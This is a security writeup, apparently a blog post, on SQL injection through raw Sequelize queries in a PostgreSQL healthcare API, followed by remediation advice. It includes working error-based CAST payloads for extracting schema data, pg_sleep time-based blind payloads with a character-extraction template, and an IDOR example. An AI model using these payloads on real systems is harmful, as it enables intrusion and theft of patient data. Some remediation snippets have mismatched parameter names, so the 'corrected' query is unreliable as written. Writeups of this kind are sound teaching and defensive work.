@@ -1,0 +1,322 @@
+---
+title: "Sequelize Raw-Query SQL Injection via the Sort Parameter"
+summary: "Sequelize is the default ORM for most Node.js teams, and almost every team using it has at least one place where they reach past the parameterised API and write a raw query — typically to handle a feature the high-level API doesn't ergonomically support, like ORDER BY on a user-supplied column. That single shortcut is where the SQLi sneaks in. Walked end-to-end against a PostgreSQL backend serving PHI: error-based exfiltration in one path and time-based blind in another, both from the same root cause."
+date: 2026-04-25
+severity: Critical
+cvss: 9.8
+cwe: "CWE-89"
+product: "Node.js / Sequelize ORM (PostgreSQL backend)"
+status: "Public"
+tags: ["sql-injection", "sequelize", "postgresql", "orm-bypass", "node-js", "class-of-vuln"]
+order: 4
+featured: false
+type: "Class"
+readingTime: 8
+---
+
+This writeup is the same class of bug walked through two different paths into the same
+Sequelize-backed API. One path leaks the database structure synchronously via error-based
+SQLi; the other leaks it asynchronously via time-based blind SQLi. The shape is identical in
+both cases — a user-supplied parameter is interpolated into a raw SQL fragment without
+parameter binding. The findings come from an authorised engagement against a HIPAA-scope
+healthcare API; specifics are sanitised. The pattern is generic.
+
+The reason this class keeps showing up in production code is **the ergonomics of the ORM**.
+Sequelize's `Op.like`, parameterised `replacements`, and bind-parameter syntax all exist and
+all work. Developers reach past them anyway, because the syntax for "ORDER BY column ASC|DESC,
+where both column and direction are user-supplied" doesn't have a single clean idiom in the
+high-level API. The result is the same bug, over and over, in slightly different shapes.
+
+## Path 1 — Error-based SQLi via the sort parameter
+
+A list endpoint that accepts a JSON `sort` object:
+
+```http
+GET /api/records?sort[colId]=name&sort[direction]=ASC
+```
+
+The handler builds an `ORDER BY` clause from those two fields. The high-level API for this
+is `order: [['name', 'ASC']]`, which Sequelize will validate and escape. The code instead
+reaches for raw concatenation:
+
+```typescript
+// records.service.ts
+const { colId, direction } = req.query.sort;
+const order = `ORDER BY "${colId}" ${direction}`;
+
+return sequelize.query(
+  `SELECT * FROM records ${order} LIMIT 50`,
+  { type: sequelize.QueryTypes.SELECT }
+);
+```
+
+`direction` is a string. There is no validation. The author probably looked at the field
+once and decided "well, the frontend only ever sends `ASC` or `DESC`, so this is fine."
+That is the moment the bug enters production.
+
+### The exploit
+
+Any value the attacker can sneak into `direction` is appended verbatim to the SQL string.
+PostgreSQL is a friendly target for this — the `CAST(...)` trick lets the attacker exfiltrate
+strings as integers that get rendered in the error message when the cast fails:
+
+```http
+GET /api/records?sort[colId]=name&sort[direction]=ASC,(SELECT CAST(version() AS INT))
+```
+
+The query the server executes:
+
+```sql
+SELECT * FROM records ORDER BY "name" ASC, (SELECT CAST(version() AS INT)) LIMIT 50
+```
+
+`version()` returns a string. The cast fails. The error message that PostgreSQL returns —
+which the API helpfully echoes back to the client because the development team never
+configured generic error handling — is:
+
+```json
+{
+  "statusCode": 521,
+  "message": "invalid input syntax for type integer: \"PostgreSQL 16.8 on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit\""
+}
+```
+
+That single response contains the full PostgreSQL version banner. The attacker now knows the
+exact version and platform. The technique generalises — `current_database()`,
+`current_user`, `information_schema.columns` — each one can be CAST-rendered into an
+integer-conversion error, and each one exfiltrates a different slice of the schema.
+
+A few iterations against the same endpoint with progressively more invasive payloads:
+
+```
+?sort[direction]=ASC,(SELECT CAST(current_database() AS INT))
+→ "invalid input syntax for type integer: \"app_production\""
+
+?sort[direction]=ASC,(SELECT CAST(current_user AS INT))
+→ "invalid input syntax for type integer: \"app_user\""
+
+?sort[direction]=ASC,(SELECT CAST(string_agg(column_name,',') AS INT)
+                       FROM information_schema.columns
+                       WHERE table_name='users')
+→ "invalid input syntax for type integer: \"id,email,password_hash,role,created_at,..\""
+```
+
+Schema discovery in three requests. The pattern works against any error-based payload that
+fits inside a PostgreSQL string-to-integer cast.
+
+## Path 2 — Time-based blind SQLi via the cohort parameter
+
+A different endpoint, same codebase, same root cause:
+
+```http
+GET /api/records/12/items/pending?groupIds=1,2,3
+```
+
+The handler this time builds a CTE query and inlines `groupIds` directly into it via
+`sequelize.query()`. Same lack of parameter binding. The error handler on this endpoint
+*does* swallow the raw error message — it returns a generic 500. So the error-based
+exfiltration that worked against `/api/records` doesn't work here. Time-based blind does.
+
+```http
+GET /api/records/1/items/pending?groupIds=1)%20OR%20pg_sleep(5)%20AND%20(1=1
+```
+
+The server processes the request synchronously and returns a response five seconds later:
+
+```
+http_code=200  time_total=5.012
+```
+
+Bump the sleep:
+
+```http
+?groupIds=1)%20OR%20pg_sleep(10)%20AND%20(1=1
+→ time_total=10.023
+```
+
+Linear in the sleep duration. That's the signal. Time-based blind exfiltration of arbitrary
+values follows the standard pattern — substring extraction in a `CASE WHEN` that triggers
+`pg_sleep` when the guessed character matches:
+
+```sql
+1) OR (
+  CASE WHEN substring((SELECT current_user)::text from 1 for 1) = 'e'
+       THEN pg_sleep(5)
+       ELSE pg_sleep(0)
+  END
+) AND (1=1
+```
+
+Slow, but reliable. A reasonable wrapper script bumps through ASCII space and extracts
+arbitrary string values one character at a time. The full PostgreSQL version banner takes
+maybe 10–15 minutes per query depending on the timing tolerance.
+
+## Bonus — Cross-record enumeration
+
+The same endpoint takes a `recordId` in the URL path:
+
+```http
+GET /api/records/<recordId>/items/pending?groupIds=...
+```
+
+`recordId` is interpolated raw into the same query alongside `groupIds`. There's no
+ownership check on the request — a user authenticated as record-owner #12 can query patient
+#15's items by just changing the URL. The SQLi is the headline finding; the IDOR
+sitting next to it is a parallel finding that pads the impact.
+
+In the engagement this was reported as a separate Broken Object Level Authorization issue
+(OWASP API1:2023), with the SQLi as a critical-severity sibling. Both share the same root
+cause: the route handler treats URL and query parameters as trusted.
+
+## Root cause
+
+Looking at the helper that both endpoints reach into:
+
+```typescript
+// query.helper.ts (vulnerable)
+export async function getPendingItems(recordId: number, groupIds: string) {
+  const sql = `
+    WITH eligible AS (
+      SELECT * FROM items
+      WHERE record_id = ${patientId}
+        AND group_id IN (${groupIds})
+    )
+    SELECT * FROM eligible WHERE completed_at IS NULL
+  `;
+  return sequelize.query(sql, { type: QueryTypes.SELECT });
+}
+```
+
+Two string concatenations, two SQLi vectors. The CTE structure is incidental — the bug
+would be exactly the same with a flat `SELECT`. Sequelize's `replacements` argument exists
+precisely to make this case safe:
+
+```typescript
+// corrected
+const sql = `
+  WITH eligible AS (
+    SELECT * FROM items
+    WHERE record_id = :patientId
+      AND group_id = ANY(:groupIds)
+  )
+  SELECT * FROM eligible WHERE completed_at IS NULL
+`;
+
+return sequelize.query(sql, {
+  replacements: { recordId, groupIds: groupIds.split(',').map(Number) },
+  type: QueryTypes.SELECT,
+});
+```
+
+Two changes. Use `:name` placeholders for every user input. Pass everything through
+`replacements`. The driver does the escaping, the database parser sees parameter markers,
+and the data is never confused with the SQL grammar.
+
+## Remediation, by severity
+
+### 1. Eliminate raw `sequelize.query` for user-controlled values
+
+Every `sequelize.query(...)` call in the codebase should pass user-controlled values via
+`replacements` or `bind` and the bound values should be typed. Easy grep to find every
+candidate:
+
+```bash
+grep -rn 'sequelize\.query(`' src/
+grep -rn '\${.*}.*sequelize\.query' src/
+```
+
+If the call site has a template literal with `${...}` inside the query string, it is almost
+always a bug or one merge away from being one. The exceptions are vanishingly rare and
+should be commented explicitly.
+
+### 2. Allow-list the column and direction parameters
+
+For the original ORDER BY use case, the high-level API works once you allow-list the inputs:
+
+```typescript
+const allowedColumns = ['name', 'created_at', 'updated_at'];
+const allowedDirection = ['ASC', 'DESC'];
+
+const col = allowedColumns.includes(req.query.colId) ? req.query.colId : 'id';
+const dir = allowedDirection.includes(req.query.direction) ? req.query.direction : 'ASC';
+
+const result = await Patient.findAll({
+  order: [[col, dir]],
+  limit: 50,
+});
+```
+
+Twelve lines of validation, zero raw SQL. The frontend may need to be updated to send a
+controlled vocabulary, which is the right outcome anyway.
+
+### 3. Suppress raw SQL errors in production
+
+Path 1's error-based exfiltration is two findings, not one. The SQLi is the primary; the
+**raw PostgreSQL error message in the HTTP response body** is the amplifier. A production
+API should never return the database driver's verbatim error text to the client.
+
+```typescript
+// global error handler
+app.use((err, req, res, next) => {
+  logger.error({ err }, 'unhandled request error');
+  res.status(500).json({ statusCode: 500, message: 'Internal Server Error' });
+});
+```
+
+Log the detail server-side. Return a generic message to the client. This single change
+demotes Path 1 from "easily exfiltrate schema" to "blind, requires time-based oracle" —
+slower, noisier, much more detectable.
+
+### 4. Enforce ownership at the route layer
+
+The IDOR sibling — `recordId` from the URL with no ownership check — needs middleware that
+intersects the request's `recordId` with the cohort claims in the user's JWT:
+
+```typescript
+// patient.guard.ts
+canActivate(context: ExecutionContext): boolean {
+  const req = context.switchToHttp().getRequest();
+  const userCohorts = req.user.cohorts as number[];
+  const requestedPatientId = +req.params.patientId;
+
+  const patient = patientRepository.findOne(requestedPatientId);
+  return userCohorts.includes(patient.group_id);
+}
+```
+
+Applied at the route, so the handler can trust that any `recordId` it sees has been
+authorised.
+
+## Hunting for this in your own codebase
+
+Three queries:
+
+```bash
+# Direct raw-query antipattern
+grep -rEn 'sequelize\.query\(\s*`[^`]*\$\{[^}]+\}' --include="*.ts" --include="*.js"
+
+# Op.like with user input — different shape, same risk
+grep -rEn '\[Op\.like\]:\s*[`"]\$\{' --include="*.ts" --include="*.js"
+
+# Spread of req.query / req.body into where clauses (mass-assignment + SQLi)
+grep -rEn 'where:\s*\{[^}]*\.\.\.req\.(query|body)' --include="*.ts" --include="*.js"
+```
+
+Each one returns a list of candidates worth a half-hour of careful review.
+
+## The lesson worth remembering
+
+ORMs do not, by themselves, protect against SQL injection. They make it *easier to write
+safe code* — the high-level API parameterises everything. They also make it easier to write
+unsafe code, because the moment a developer reaches into `query()` they're back to writing
+raw SQL, and the same mental shift that comes with "I'm writing raw SQL, so I should
+parameterise everything" doesn't always happen.
+
+The cure isn't training. The cure is **make the high-level API cover the case the
+developer reached past it for**. Sequelize's `order: [['name', 'ASC']]` syntax covers the
+sort-parameter use case. The team using it didn't know that, or knew it and forgot, or
+hit a corner case (compound sort across joined tables) where the API got awkward and chose
+the easy path.
+
+Make the safe path the path of least resistance. Lint for the unsafe one. Review the
+matches.
